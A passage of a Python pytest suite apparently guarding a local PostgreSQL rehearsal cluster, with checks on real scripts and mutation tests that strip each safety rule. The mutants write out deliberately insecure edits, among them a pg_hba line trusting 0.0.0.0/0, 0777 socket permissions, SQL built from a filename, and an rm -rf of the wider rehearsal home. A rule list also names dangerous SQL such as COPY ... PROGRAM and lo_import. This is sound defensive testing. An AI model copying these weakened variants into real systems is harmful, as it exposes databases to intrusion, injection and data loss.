        assert_clean_child_env(e, caller_home, e["tool"])
        seen.add(e["tool"])
    assert {"initdb", "pg_ctl", "psql"} <= seen


# ------------------------------------------------------------------------------------------------
# tests on the real files
# ------------------------------------------------------------------------------------------------

REAL_CHECKS: dict[str, Callable] = {
    "guard": check_guard_all,
    "apply_ordering": check_apply_ordering,
    "apply_refusals": check_apply_refusals,
    "apply_env": check_apply_env,
    "apply_identity": check_apply_identity,
    "replay_unsafe": check_replay_unsafe,
    "replay_record": check_replay_record,
    "replay_env": check_replay_env,
    "replay_identity": check_replay_identity,
    "cluster_reset_requires_yes": check_cluster_reset_requires_yes,
    "cluster_reset_scope": check_cluster_reset_scope,
    "cluster_init_idempotent": check_cluster_init_idempotent,
    "cluster_symlink": check_cluster_symlink_refused,
    "cluster_db_check_failure": check_cluster_db_check_failure,
    "cluster_identity": check_cluster_identity,
    "cluster_lsof": check_cluster_lsof,
    "cluster_env": check_cluster_env,
}


@pytest.mark.parametrize("name", sorted(REAL_CHECKS))
def test_real_files_pass_check(name, tmp_path):
    REAL_CHECKS[name](REHEARSAL_DIR, tmp_path)


@pytest.fixture(scope="module")
def guard():
    return load_module(REHEARSAL_DIR, "rehearsal_guard")


@pytest.mark.parametrize("label", sorted(REFUSED))
def test_each_refusal_case(label, guard):
    spec = REFUSED[label]
    url, needle = spec if isinstance(spec, tuple) else (spec, None)
    ok, reason = guard.check_rehearsal_url(url)
    assert ok is False, f"[{label}] {url!r} was accepted"
    assert reason and (needle is None or needle in reason)


@pytest.mark.parametrize("url", sorted(ACCEPTED))
def test_each_accepted_case_is_normalised(url, guard):
    assert guard.check_rehearsal_url(url) == (True, "ok")
    assert guard.normalise_rehearsal_url(url) == ACCEPTED[url]


def test_rehearsal_constants(guard):
    assert guard.REHEARSAL_PORT == 55432 and guard.REHEARSAL_HOST == "127.0.0.1"


def test_no_script_still_mentions_localhost_as_allowed():
    for f in ("rehearsal_guard.py", "replay_schema.py"):
        text = (REHEARSAL_DIR / f).read_text()
        assert "ALLOWED_HOSTS" not in text and 'frozenset({"localhost"' not in text


# ------------------------------------------------------------------------------------------------
# per-rule mutants: each must make its check FAIL
# ------------------------------------------------------------------------------------------------

Edit = tuple  # (old, new) exact replacement, or ("re", pattern, repl)


@dataclass
class Mutant:
    id: str
    file: str
    edits: list
    check: str


def _never(label: str):
    return ("re", rf'\("{re.escape(label)}", re\.compile\(.*\)\),', f'("{label}", re.compile(r"(?!)")),')


G = "rehearsal_guard.py"
A = "apply_schema.sh"
R = "replay_schema.py"
C = "rehearsal_cluster.sh"
OFF = "    if False:"

MUTANTS = [
    # --- guard rules ---
    Mutant("guard: empty-URL check removed", G, [('    if not isinstance(url, str) or url == "":', OFF)], "guard"),
    Mutant("guard: whitespace/newline/control check removed", G, [("    if _BAD_CHARS.search(url):", OFF)], "guard"),
    Mutant("guard: production-marker check removed", G, [("        if marker in low:", "        if False:")], "guard"),
    Mutant("guard: scheme check removed", G, [("    if not sep or scheme not in ALLOWED_SCHEMES:", OFF)], "guard"),
    Mutant("guard: double-@ check removed", G, [('    if authority.count("@") > 1:', OFF)], "guard"),
    Mutant("guard: password check removed", G, [('        if ":" in userinfo:', "        if False:")], "guard"),
    Mutant("guard: userinfo pattern check removed", G, [("        if not USER_RE.fullmatch(userinfo):", "        if False:")], "guard"),
    Mutant("guard: host check removed", G, [("    if host_raw != REHEARSAL_HOST:", OFF)], "guard"),
    Mutant("guard: port check removed", G, [("    if port_raw != str(REHEARSAL_PORT):", OFF)], "guard"),
    Mutant("guard: database check removed", G, [("    if not DB_NAME_RE.fullmatch(path):", OFF)], "guard"),
    Mutant("guard: database fullmatch -> match", G, [("DB_NAME_RE.fullmatch(path)", "DB_NAME_RE.match(path)")], "guard"),
    Mutant("guard: single-query-parameter check removed", G, [("        if len(pairs) != 1:", "        if False:")], "guard"),
    Mutant("guard: query-key check removed", G,
           [('        if key not in ALLOWED_QUERY_KEYS or "%" in query.split("=", 1)[0]:', "        if False:")], "guard"),
    Mutant("guard: strict query parsing removed", G, [("strict_parsing=True", "strict_parsing=False")], "guard"),
    Mutant("guard: application_name value check removed", G,
           [('        if not APPNAME_RE.fullmatch(value) or "%" in query:', "        if False:")], "guard"),
    Mutant("guard: returns the original URL, not the normalised one", G,
           [("    normalised = f\"postgresql://{userinfo + '@' if at else ''}{REHEARSAL_HOST}:{REHEARSAL_PORT}/{path}\"",
             "    normalised = url")], "guard"),
    Mutant("guard: CLI prints the original URL", G, [("    print(normalised)", "    print(url)")], "guard"),
    Mutant("guard: check_rehearsal_url always ok", G,
           [("    return normalised is not None, reason", "    return True, reason")], "guard"),
    # --- apply_schema.sh ---
    Mutant("apply: guard call removed", A,
           [('"${PY}" "${HERE}/rehearsal_guard.py" "${URL}")" \\', 'echo "${URL}")" \\')], "apply_ordering"),
    Mutant("apply: guard call removed (dynamic)", A,
           [('"${PY}" "${HERE}/rehearsal_guard.py" "${URL}")" \\', 'echo "${URL}")" \\')], "apply_refusals"),
    Mutant("apply: guard output ignored (original URL used)", A,
           [('URL="$(env -i PATH="/usr/bin:/bin" HOME=/var/empty "${PY}" "${HERE}/rehearsal_guard.py" "${URL}")" \\',
             'env -i PATH="/usr/bin:/bin" HOME=/var/empty "${PY}" "${HERE}/rehearsal_guard.py" "${URL}" >/dev/null \\')],
           "apply_env"),
    Mutant("apply: migrate runs without env -i", A,
           [('env -i PATH="${NODE_DIR}:/usr/bin:/bin" HOME="${TMP_HOME}" DATABASE_URL="${URL}"',
             'env PATH="${NODE_DIR}:/usr/bin:/bin" HOME="${TMP_HOME}" DATABASE_URL="${URL}"')], "apply_env"),
    Mutant("apply: migrate gets the real HOME", A,
           [('HOME="${TMP_HOME}" DATABASE_URL="${URL}"', 'HOME="${HOME}" DATABASE_URL="${URL}"')], "apply_env"),
    Mutant("apply: migrate identity check removed", A,
           [('      *) die "server identity ${ident} is not the rehearsal cluster" ;;', "      *) ;;")], "apply_identity"),
    # --- replay_schema.py ---
    Mutant("replay: unsafe-file pre-scan removed", R,
           [("    why = unsafe_reason(sql)\n    if why is not None:\n        return False, REFUSED_UNSAFE + why\n", "")],
           "replay_unsafe"),
    Mutant("replay: meta-command rule removed", R, [("re", r"UNSAFE_META = re\.compile\(.*", 'UNSAFE_META = re.compile(r"(?!)")')],
           "replay_unsafe"),
    *[Mutant(f"replay: {label} rule removed", R, [_never(label)], "replay_unsafe")
      for label in ("COPY ... PROGRAM", "dblink", "foreign data wrapper (_fdw)", "CREATE SERVER", "ALTER SYSTEM",
                    "lo_import/lo_export")],
    Mutant("replay: record() builds SQL from the filename", R,
           [("    r = run_psql(url, \"-v\", f\"fname={name}\", \"-v\", f\"fsha={sha256_of(path)}\",\n"
             "                 stdin=\"INSERT INTO _migrations_applied (filename, sha256) VALUES (:'fname', :'fsha') \"\n"
             "                       \"ON CONFLICT (filename) DO NOTHING;\\n\")",
             "    r = run_psql(url, stdin=f\"INSERT INTO _migrations_applied (filename, sha256) VALUES \"\n"
             "                 f\"('{name}', '{sha256_of(path)}') ON CONFLICT (filename) DO NOTHING;\\n\")")],
           "replay_record"),
    Mutant("replay: psql children inherit the caller environment", R, [("env=pg_env(),", "env=None,")], "replay_env"),
    Mutant("replay: server identity check removed", R,
           [('    if int(port) != REHEARSAL_PORT or not db.startswith("rehearsal") or ddir != EXPECTED_DATA_DIR:', OFF)],
           "replay_identity"),
    # --- rehearsal_cluster.sh ---
    Mutant("cluster: reset --yes requirement removed", C,
           [('[ "${1:-}" = "--yes" ] || die "reset destroys ALL rehearsal data; re-run with: $0 reset --yes"', "true")],
           "cluster_reset_requires_yes"),
    Mutant("cluster: reset deletes the whole rehearsal home", C, [('  rm -rf "${DATA_DIR}"', '  rm -rf "${REHEARSAL_HOME}"')],
           "cluster_reset_scope"),
    Mutant("cluster: symlink/realpath checks removed", C,
           [("assert_no_symlinks() {", "assert_no_symlinks() { return 0")], "cluster_symlink"),
    Mutant("cluster: socket directory not chmod 700", C, [('chmod 700 "${SOCK_DIR}"', "true")], "cluster_init_idempotent"),
    Mutant("cluster: unix_socket_permissions weakened", C,
           [("unix_socket_permissions = 0700", "unix_socket_permissions = 0777")], "cluster_init_idempotent"),
    Mutant("cluster: pg_hba opens the world", C,
           [("host    all   all   127.0.0.1/32  trust", "host    all   all   0.0.0.0/0  trust")],
           "cluster_init_idempotent"),
    Mutant("cluster: failed database check reported as 'already exists'", C,
           [('    || die "init: could not check whether database ${DBNAME} exists"', "    || true"),
            ('  elif [ "${have}" = "1" ]; then', "  else")], "cluster_db_check_failure"),
    Mutant("cluster: PGOPTIONS passed through to every tool", C,
           [('PGSERVICEFILE="${TMP_HOME}/.no-pg-service" "$@"',
             'PGSERVICEFILE="${TMP_HOME}/.no-pg-service" ${PGOPTIONS:+PGOPTIONS="$PGOPTIONS"} "$@"')], "cluster_env"),
    Mutant("cluster: real HOME for the tools", C,
           [('HOME="${TMP_HOME}" LANG="en_US.UTF-8" \\', 'HOME="${HOME}" LANG="en_US.UTF-8" \\')], "cluster_env"),
    Mutant("cluster: server identity check removed", C,
           [('  [ "${ident}" = "127.0.0.1|${PORT}|${DATA_DIR}" ] || die "server identity \'${ident}\' is not the rehearsal cluster; refusing"',
             "  true")], "cluster_identity"),
    Mutant("cluster: lsof probe fails open", C, [('    *) die "lsof probe failed (rc=${rc}); failing closed" ;;', "    *) ;;")],
           "cluster_lsof"),
    Mutant("cluster: foreign listener on the port tolerated", C,
           [('    0) is_running || die "port ${PORT} is in use by another process; refusing to start" ;;', "    0) ;;")],
           "cluster_lsof"),
]


def apply_edits(text: str, edits: list) -> str:
    for edit in edits:
        if edit[0] == "re":
            new, n = re.subn(edit[1], lambda m: edit[2], text, flags=re.M)
            assert n >= 1, f"mutant pattern {edit[1]!r} matched nothing (source drifted)"
        else:
            old, new_s = edit
            assert old in text, f"mutant snippet not found (source drifted): {old!r}"
            new = text.replace(old, new_s)
        assert new != text, "mutant changed nothing"
        text = new
    return text


@pytest.mark.parametrize("mutant", MUTANTS, ids=[m.id for m in MUTANTS])
def test_mutant_is_killed(mutant, tmp_path):
    mdir = tmp_path / "mutant"
    shutil.copytree(REHEARSAL_DIR, mdir, ignore=shutil.ignore_patterns("__pycache__"))
    target = mdir / mutant.file
    target.write_text(apply_edits(target.read_text(), mutant.edits))
    work = tmp_path / "work"
    work.mkdir()
    with pytest.raises(AssertionError):
        REAL_CHECKS[mutant.check](mdir, work)


def test_every_check_has_a_mutant():
    """A check with no mutant could be vacuous; every named check must have at least one killer."""
    covered = {m.check for m in MUTANTS}
    assert covered >= set(REAL_CHECKS), sorted(set(REAL_CHECKS) - covered)


def test_mutant_count_is_reported():
    print(f"\nE5.6 per-rule mutants: {len(MUTANTS)}")
    assert len(MUTANTS) >= 30
